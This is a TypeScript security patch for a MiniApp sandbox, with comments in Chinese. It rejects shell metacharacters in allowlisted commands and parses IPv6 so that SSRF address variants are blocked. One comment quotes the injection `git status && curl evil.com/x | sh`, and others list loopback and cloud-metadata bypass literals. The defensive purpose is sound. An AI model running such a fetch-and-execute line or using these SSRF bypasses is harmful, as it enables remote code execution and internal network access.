@@ -107,12 +107,33 @@ export function isPathAllowed(path: string, allowedPrefixes: readonly string[]):
 /**
  * shell 命令名白名单：取首个空白分隔 token。
  *
- * 刻意**不**实现完整 shell 解析（引号 / 管道 / 重定向）—— 那等于内嵌一个
- * shell 解释器。白名单的语义是"这个 MiniApp 允许启动 `git`，不允许启动
- * `powershell`"；真正防住 `git ... && evil` 这类组合的是执行侧，命令名之外的
- * 二次授权由宿主 prompt 承担。
+ * ## 为什么要同时拒掉 shell 元字符
+ *
+ * 白名单的语义是"这个 MiniApp 允许启动 `git`"。但执行侧把**整条字符串**交给
+ * `promisify(exec)`，也就是 `cmd.exe /d /s /c <整条>`（POSIX 下 `/bin/sh -c`）。
+ * 于是 `git status && curl evil.com/x | sh` 的首个 token 确实是 `git`、白名单
+ * 放行，随后 `&&` / `&` / `|` / `^` / `%VAR%` 全部照常执行 —— 声明一条无害
+ * 命令就换来了完整任意命令执行。Windows 上尤其直接：`&` 和 `>` 就能落地文件。
+ *
+ * 早先这里写着"真正防住 `git ... && evil` 这类组合的是执行侧"，而执行侧并不存在
+ * 这样的防护；这行注释本身就是这个洞的说明书。
+ *
+ * 修法是**连元字符一起拒**，而不是去实现完整 shell 解析（那等于内嵌一个 shell
+ * 解释器，且每个平台的转义规则都不相同）。代价是 MiniApp 不能用管道 / 重定向 /
+ * 逻辑连接；要这些能力应当是宿主显式提供的能力，而不是从 `shell.allow` 里漏出去。
+ *
+ * 引号内的元字符同样拒：不做引号解析就无法区分"引号里的 `&`"和"引号外的 `&`"
+ * ——而 `cmd.exe` 自己在若干位置上的引号规则与 POSIX 不同，猜错就是漏。
+ * 落败方向是 fail-closed：宁可少放行一条合法命令，不放行一条组合命令。
+ *
+ * 字符集只收**能改变执行**的那些（串联、替换、重定向、变量展开、转义、引号），
+ * 刻意不收 `~ * ? , [ ] { }`：它们是 glob / 花括号展开，只会改参数不会改命令，
+ * 收进来只会误伤 `git diff HEAD~20 HEAD` 这类内置应用真实在发的命令。
  */
+const SHELL_METACHARACTERS = /[;&|<>^`%!()$"'\r\n]/;
+
 export function commandAllowed(command: string, allowList: readonly string[]): boolean {
+  if (SHELL_METACHARACTERS.test(command)) return false;
   const first = (command.trim().split(/\s+/)[0] ?? '').toLowerCase();
   if (!first) return false;
   return allowList.some((allowed) => {
@@ -142,18 +163,87 @@ export function hostAllowed(url: string, allowList: readonly string[]): boolean 
  * 云 metadata（`169.254.169.254`）与 loopback 都能把宿主变成内网跳板。白名单
  * 是域名级控制，这里是解析结果级控制 —— 攻击者可用自己的白名单域名指向
  * `127.0.0.1`，只有这层拦得住。
+ *
+ * ## 为什么 IPv6 要真的解析，不能拿正则比字面量
+ *
+ * 同一台机器有无穷多种写法。正则版漏掉的每一种都是一条 SSRF 通道，而且漏得
+ * 很安静：`[::ffff:7f00:1]`（= 127.0.0.1）与 `[::ffff:a9fe:a9fe]`
+ * （= 169.254.169.254）都匹配不上任何一条 IPv4 正则，于是云 metadata 那条红线
+ * 形同虚设；连**完全展开**的 `[0:0:0:0:0:0:0:1]` 也匹配不上 `::1`。
+ * 逐个补字面量是打地鼠 —— 下一个变体还会漏。
+ *
+ * 所以这里把 IPv6 解析成 8 个 16-bit 组再判定。顺带把 `::ffff:0:0/96`
+ * （IPv4-mapped）与 `::/96`（deprecated 的 IPv4-compatible）解出内嵌的
+ * IPv4 交给同一套 IPv4 规则 —— 它们本来就是 IPv4，只是写成了 IPv6。
+ *
+ * 已知的**剩余**缺口：这层判的是 URL 里的字面量，从不解析 DNS，所以
+ * "自己的白名单域名解析到 127.0.0.1"这一类仍需在出口处做解析后校验才能根治。
+ * 那需要 connect 阶段的地址钉扎，是比本函数大一号的改动，别在这里假装修好了。
  */
 export function isPrivateHostname(hostname: string): boolean {
   const h = hostname.toLowerCase().replace(/^\[|\]$/g, '');
   if (h === 'localhost' || h.endsWith('.localhost')) return true;
-  if (h === '::1' || h === '0.0.0.0' || h === '::') return true;
-  // IPv6 ULA fc00::/7 与链路本地 fe80::/10
-  if (/^f[cd][0-9a-f]{2}:/.test(h) || /^fe[89ab][0-9a-f]:/.test(h)) return true;
+  if (h === '0.0.0.0') return true;
+  if (h.includes(':')) {
+    const v6 = parseIpv6(h);
+    // 长得像 IPv6 但解析不出来 = 不是我们认识的地址。fail-closed：宁可拒。
+    if (!v6) return true;
+    // ::ffff:a.b.c.d 与 ::a.b.c.d —— 就是 IPv4，只是写成了 IPv6
+    const v4mapped = v6.slice(0, 5).every((g) => g === 0) && v6[5] === 0xffff;
+    const v4compat = v6.slice(0, 6).every((g) => g === 0) && v6[6] !== 0;
+    if (v4mapped || v4compat) return isPrivateIpv4(groupsToIpv4(v6[6], v6[7]));
+    if (v6.every((g) => g === 0)) return true; // ::
+    if (v6.slice(0, 7).every((g) => g === 0) && v6[7] === 1) return true; // ::1
+    if ((v6[0] & 0xfe00) === 0xfc00) return true; // fc00::/7 ULA
+    if ((v6[0] & 0xffc0) === 0xfe80) return true; // fe80::/10 链路本地
+    return false;
+  }
+  return isPrivateIpv4(h);
+}
+
+function isPrivateIpv4(h: string): boolean {
   if (/^127\./.test(h) || /^10\./.test(h) || /^192\.168\./.test(h)) return true;
   if (/^169\.254\./.test(h)) return true;
   const m = /^172\.(\d{1,3})\./.exec(h);
-  if (m && Number(m[1]) >= 16 && Number(m[1]) <= 31) return true;
-  return false;
+  return !!m && Number(m[1]) >= 16 && Number(m[1]) <= 31;
+}
+
+function groupsToIpv4(hi: number, lo: number): string {
+  return `${hi >> 8}.${hi & 0xff}.${lo >> 8}.${lo & 0xff}`;
+}
+
+/**
+ * IPv6 文本 → 8 个 16-bit 组；解析不出来返回 null。
+ * 支持 `::` 压缩与结尾的内嵌 IPv4 四段式（`::ffff:127.0.0.1`）。
+ */
+function parseIpv6(h: string): number[] | null {
+  const halves = h.split('::');
+  if (halves.length > 2) return null;
+  const toGroups = (part: string): number[] | null => {
+    if (!part) return [];
+    const out: number[] = [];
+    for (const seg of part.split(':')) {
+      if (seg.includes('.')) {
+        const v4 = seg.split('.');
+        if (v4.length !== 4) return null;
+        const n = v4.map((x) => (/^\d{1,3}$/.test(x) ? Number(x) : NaN));
+        if (n.some((x) => !Number.isInteger(x) || x > 255)) return null;
+        out.push((n[0] << 8) | n[1], (n[2] << 8) | n[3]);
+        continue;
+      }
+      if (!/^[0-9a-f]{1,4}$/.test(seg)) return null;
+      out.push(parseInt(seg, 16));
+    }
+    return out;
+  };
+  const left = toGroups(halves[0]);
+  if (!left) return null;
+  if (halves.length === 1) return left.length === 8 ? left : null;
+  const right = toGroups(halves[1]);
+  if (!right) return null;
+  const fill = 8 - left.length - right.length;
+  if (fill < 1) return null;
+  return [...left, ...new Array<number>(fill).fill(0), ...right];
 }
 
 // rmdir / unlink 是单路径的删除动作，归入写侧：能写才能删
